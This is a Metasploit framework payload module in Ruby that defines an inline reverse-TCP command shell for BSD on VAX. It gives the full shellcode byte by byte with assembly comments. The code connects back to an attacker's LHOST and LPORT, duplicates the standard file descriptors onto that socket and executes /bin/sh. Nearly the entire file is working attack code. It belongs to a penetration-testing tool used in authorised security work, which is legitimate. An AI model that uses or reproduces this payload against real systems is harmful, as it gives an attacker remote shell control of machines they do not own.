##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'

module MetasploitModule

  CachedSize = 100

  # This is so one-off that we define it here
  ARCH_VAX = 'vax'

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'BSD Command Shell, Reverse TCP Inline',
      'Description' => 'Connect back to attacker and spawn a command shell',
      'Author'      => 'wvu',
      'License'     => MSF_LICENSE,
      'Platform'    => 'bsd',
      'Arch'        => ARCH_VAX,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::CommandShellUnix,
      'Payload'     => {
        'Offsets'   => {
          'LHOST'   => [24, 'ADDR'],
          'LPORT'   => [32, 'n']
        },
        'Payload'   =>
          "\xdd\x00" +                 # pushl  $0
          "\xdd\x01" +                 # pushl  $1
          "\xdd\x02" +                 # pushl  $2
          "\xdd\x03" +                 # pushl  $3
          "\xd0\x5e\x5c" +             # movl   sp,ap
          "\xbc\x8f\x61\x00" +         # chmk   $61
          "\xd0\x50\x5a" +             # movl   r0,r10
          "\xdd\x00" +                 # pushl  $0
          "\xdd\x00" +                 # pushl  $0
          "\xdd\x8f\x00\x00\x00\x00" + # pushl  LHOST
          "\xdd\x8f\x02\x00\x00\x00" + # pushl  AF_INET + LPORT
          "\xd0\x5e\x5b" +             # movl   sp,r11
          "\xdd\x10" +                 # pushl  $10
          "\xdd\x5b" +                 # pushl  r11
          "\xdd\x5a" +                 # pushl  r10
          "\xdd\x03" +                 # pushl  $3
          "\xd0\x5e\x5c" +             # movl   sp,ap
          "\xbc\x8f\x62\x00" +         # chmk   $62
          "\xd0\x00\x5b" +             # movl   $0,r11
          "\xdd\x5b" +                 # pushl  r11
          "\xdd\x5a" +                 # pushl  r10
          "\xdd\x02" +                 # pushl  $2
          "\xd0\x5e\x5c" +             # movl   sp,ap
          "\xbc\x8f\x5a\x00" +         # chmk   $5a
          "\xf3\x02\x5b\xef" +         # aobleq $2,r11,dup2
          "\xdd\x8f\x2f\x73\x68\x00" + # pushl  $68732f
          "\xdd\x8f\x2f\x62\x69\x6e" + # pushl  $6e69622f
          "\xd0\x5e\x5b" +             # movl   sp,r11
          "\xdd\x00" +                 # pushl  $0
          "\xdd\x00" +                 # pushl  $0
          "\xdd\x5b" +                 # pushl  r11
          "\xdd\x03"  +                # pushl  $3
          "\xd0\x5e\x5c" +             # movl   sp,ap
          "\xbc\x3b"                   # chmk   $3b
      }
    ))
  end

end
